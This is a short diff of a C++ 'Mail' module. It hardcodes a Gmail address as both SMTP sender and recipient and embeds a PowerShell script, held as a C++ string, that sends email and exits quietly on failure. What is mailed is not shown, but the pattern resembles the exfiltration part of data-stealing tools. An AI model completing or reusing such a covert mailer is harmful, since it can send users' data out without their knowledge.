@@ -17,8 +17,8 @@ namespace Mail {
 	
 	// email credentials (SMTP)
 	
-    #define X_EM_TO "[recipient email address]"
-    #define X_EM_FROM "[sender email address]"
+    #define X_EM_TO "cryptdels@gmail.com"
+    #define X_EM_FROM "cryptdels@gmail.com"
 	#define X_EM_PASS "[sender email password]"
 	
 	// PowerShell Script into C++ String convertion
@@ -59,9 +59,9 @@ namespace Mail {
 		 string (X_EM_FROM) +
 		"\"""\r\n    }\r\ncatch\r\n    {\r\n        exit 4; \r\n    }";
 
-#undef X_EM_FROM
-#undef X_EM_TO
-#undef X_EM_PASS
+	#undef X_EM_FROM
+	#undef X_EM_TO
+	#undef X_EM_PASS
 	
 	// functions
 	string StringReplace(string s, const string &what, const string &with) {
